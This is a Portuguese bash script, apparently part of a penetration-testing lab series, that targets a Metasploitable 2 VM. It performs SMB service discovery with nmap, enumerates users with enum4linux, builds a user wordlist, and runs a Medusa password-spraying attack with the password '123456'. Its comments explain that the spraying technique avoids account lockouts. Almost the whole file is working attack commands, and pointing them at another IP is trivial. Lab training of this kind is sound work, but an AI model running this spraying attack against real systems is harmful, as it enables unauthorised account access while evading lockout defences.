#!/bin/bash
# ============================================================
# Cenário 3: Enumeração de usuários + Password Spraying em SMB
# ============================================================
# Pré-requisitos:
#   - VM Metasploitable 2 ligada, em rede host-only
#   - Pacote samba-tools / enum4linux / smbclient instalado no Kali
#
# Uso:
#   chmod +x 03_smb_password_spraying.sh
#   ./03_smb_password_spraying.sh <IP_ALVO>
# ============================================================

ALVO="${1:-192.168.56.102}"
USUARIOS="../wordlists/usuarios_smb.txt"
SENHA_UNICA="123456"   # password spraying: 1 senha testada contra vários usuários

echo "[*] 1. Descoberta do serviço SMB"
nmap -p 139,445 -sV "$ALVO"

echo "[*] 2. Enumeração de usuários via enum4linux"
enum4linux -U "$ALVO" | tee enum4linux_output.txt

echo "[*] 3. Extraindo lista de usuários enumerados para wordlist"
grep "user:" enum4linux_output.txt | awk -F'\\[|\\]' '{print $2}' > "$USUARIOS"
cat "$USUARIOS"

echo "[*] 4. Password Spraying com Medusa (módulo smbnt)"
# Diferente da força bruta clássica (muitas senhas por usuário),
# aqui usamos POUCAS senhas comuns contra MUITOS usuários,
# para evitar bloqueio de conta por tentativas excessivas.
medusa -h "$ALVO" \
       -U "$USUARIOS" \
       -p "$SENHA_UNICA" \
       -M smbnt \
       -t 3 \
       -v 6

echo "[*] 5. Validação manual da credencial encontrada"
echo "smbclient -L //$ALVO/ -U <usuario>"
